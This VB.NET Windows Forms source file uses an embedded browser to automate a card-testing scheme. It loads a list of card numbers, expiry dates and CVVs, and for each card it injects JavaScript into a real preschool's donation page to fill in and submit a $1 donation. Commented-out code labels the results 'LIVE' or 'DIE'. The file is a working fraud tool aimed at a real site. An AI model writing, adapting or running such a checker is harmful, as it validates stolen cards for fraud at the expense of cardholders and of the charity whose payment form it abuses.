Imports CefSharp.WinForms
Imports CefSharp
Imports Microsoft.VisualBasic.CompilerServices

Public Class Form1
 
    Private WithEvents browser As ChromiumWebBrowser
    Friend flags As Boolean
    
    Public Sub New()
        InitializeComponent()
        
        Dim settings As New CefSettings()
        CefSharp.Cef.Initialize(settings)
        flags = False 
        btnInit.Enabled = flags
        
        browser = New ChromiumWebBrowser("http://www.google.com.ar") With {
            .Dock = DockStyle.Fill
        }        
        panBrowser.Controls.Add(browser)
        AddHandler browser.FrameLoadEnd, AddressOf WebBrowserFrameLoadEnd
        'Threading.Thread.Sleep(10000)
    End Sub

    Private Sub WebBrowserFrameLoadEnd(sender As Object, e As FrameLoadEndEventArgs)
        flags = True 
    End Sub

    ''' <summary>
    ''' Abre el archivo
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    Private Sub btnOpen_Click(sender As Object, e As EventArgs) Handles btnOpen.Click
        OpenFileDialog.ShowDialog()
        Dim filename = OpenFileDialog.FileName
        While Not btnInit.Enabled
            btnInit.Enabled = flags
            Threading.Thread.Sleep(10000)
        End While
         
        Try
            '========================================== 
            Dim separator As Char
            Dim datagrid As New DataTable
            Dim dr As DataRow
            '========================================== 
            lblStatus.Text = "Tarjetas cargadas..."
            lblStatus.ForeColor = Color.Red

            datagrid.Columns.Add("CC")
            datagrid.Columns.Add("MES")
            datagrid.Columns.Add("AÑO")
            datagrid.Columns.Add("CVV")
            dr = datagrid.NewRow()
            '========================================== 
            Dim file As New System.IO.StreamReader(filename)
            separator = "|"
            While file.Peek() <> -1
                datagrid.Rows.Add(file.ReadLine().Split(separator))
            End While
            dgwDataCard.DataSource = datagrid
            'Me.cbCartao.Enabled = True
            dgwDataCard.CurrentRow.Selected = True
            '==========================================
        Catch ex As Exception
            '==========================================
        End Try

        'lblContador.Text = Convert.ToString(DataGridView1.Rows.Count - 1)
        Dim tmn As Integer

        For tmn = 0 To dgwDataCard.ColumnCount - 1
            If tmn = dgwDataCard.ColumnCount - 1 Then
                dgwDataCard.Columns(tmn).AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill
            Else
                dgwDataCard.Columns(tmn).AutoSizeMode = DataGridViewAutoSizeColumnMode.DisplayedCells
            End If
        Next
    End Sub

    Private Sub btnInit_Click(sender As Object, e As EventArgs) Handles btnInit.Click
        lblstatus.Text = "Autorizando donaciones..."
        lblstatus.ForeColor = Color.Yellow 
        ' Procesamos las donaciones
        browser.Load("https://druidhillspreschool.org/relocate/index.php")
        Threading.Thread.Sleep(10000)
        For Each row As DataGridViewRow In dgwDataCard.Rows
            If row.Index = dgwDataCard.Rows.Count - 1  Then
                Exit For 
            End If                        
            ProcessDonations(row.Index)
        Next
    End Sub

    ''' <summary>
    ''' Procesa las donaciones de los registros de la grilla del fromulario
    ''' </summary>
    Private Async Sub ProcessDonations(index As Integer)

            Dim row = dgwDataCard.Rows(index)
            Dim canReadResult = False 
            While Not canReadResult
                lblstatus.Text = "Autorizando donaciones...#" + Convert.ToString(row.Index +1)
                lblstatus.ForeColor = Color.Blue 
                row.DefaultCellStyle.BackColor = Color.LightSkyBlue
                

                browser.EvaluateScriptAsync("document.getElementsByName('radio_amount')[5].checked=true").Wait()
                browser.EvaluateScriptAsync("document.getElementsByName('other_amount')[0].value='1'").Wait()
                browser.EvaluateScriptAsync("document.getElementsByName('name')[0].value='piero espire'").Wait()
                browser.EvaluateScriptAsync("document.getElementsByName('email')[0].value='empresadeperritos@gmail.com'").Wait()
                browser.EvaluateScriptAsync("document.getElementsByName('cardholder_name')[0].value='piero espire'").Wait()
                
                Dim carNumber = Conversions.ToString(row.Cells(0).Value)
                browser.EvaluateScriptAsync($"document.querySelector('input[data-stripe=""number""]').value='{carNumber}'").Wait()

                Dim carExpireMonth = Conversions.ToByte(row.Cells(1).Value).ToString()
                browser.EvaluateScriptAsync($"document.querySelector('select[data-stripe=""exp-month""]').value='{carExpireMonth}'").Wait()

                Dim carExpireYear = Conversions.ToInteger(row.Cells(2).Value).ToString()
                browser.EvaluateScriptAsync($"document.querySelector('select[data-stripe=""exp-year""]').value='{carExpireYear}'").Wait()

                Dim carCvc = Conversions.ToString(row.Cells(3).Value).ToString()
                browser.EvaluateScriptAsync($"document.getElementsByName('cvc')[0].value='{carCvc}'").Wait()


                browser.EvaluateScriptAsync($"document.getElementsByTagName('button')[0].click()").Wait()
                'ContinueWith(
                'Sub(x)
                '    If x.IsCompleted Then
                '        canReadResult = True
                '    End If
                'End Sub)
                Threading.Thread.Sleep(20000)
                ''Invocamos a subimit                
                'Dim var = WebBrowser1.Document.Forms(0).InvokeMember("submit")
                'Thread.Sleep(1500)                
                'Application.DoEvents 
                'While WebBrowser1.ReadyState <> WebBrowserReadyState.Complete 
                '    Application.DoEvents 
                'End While                
                
                'Verificamos resultados del submit                                        
                'While Not canReadResult                    
                '    lblstatus.Text = "Esperando respuesta" + DateTime.Now.ToString                        
                '    If WebBrowser1.Document.Body.InnerHtml.Contains("Thank") Then
                '        Aprovadas.Items.Add("🎶 LIVE " + row.Cells(0).Value + "|" + row.Cells(1).Value + "|" + row.Cells(2).Value + "|" + row.Cells(3).Value + " $ #bySkooty")                
                '        lblstatus.Text = "Autorizando donaciones...Aprovada"
                '        lblstatus.ForeColor = Color.Lime
                '        lblaprovadas.Text = Aprovadas.Items.Count.ToString
                '        'Me.deletaprimeralinha(Me.ar)
                '        row.DefaultCellStyle.BackColor = Color.Green             
                '    canReadResult  = True 
                '    ElseIf WebBrowser1.Document.Body.InnerHtml.Contains("There was a problem") Then
                '        Me.Reprovadas.Items.Add("✗ DIE " + row.Cells(0).Value + "|" + row.Cells(1).Value + "|" + Me.DataGridView1.CurrentRow.Cells(2).Value + "|" + row.Cells(3).Value + "  #bySkooty")
                '        lblstatus.Text = "Autorizando donaciones...Reprovada"                
                '        lblstatus.ForeColor = Color.Red
                '        lblreprovadas.Text = Reprovadas.Items.Count.ToString
                '        'Me.deletaprimeralinha(Me.ar)
                '        row.DefaultCellStyle.BackColor = Color.Red 
                '        canReadResult  = True 
                '    End If                                    
                'End While
                'canReadResult = True
                
            End While                    
        lblstatus.Text = "Proceso de autorización de donaciones finalizado"                
        lblstatus.ForeColor = Color.Black 
        'WebBrowser1.Visible = False 
    End Sub
End Class
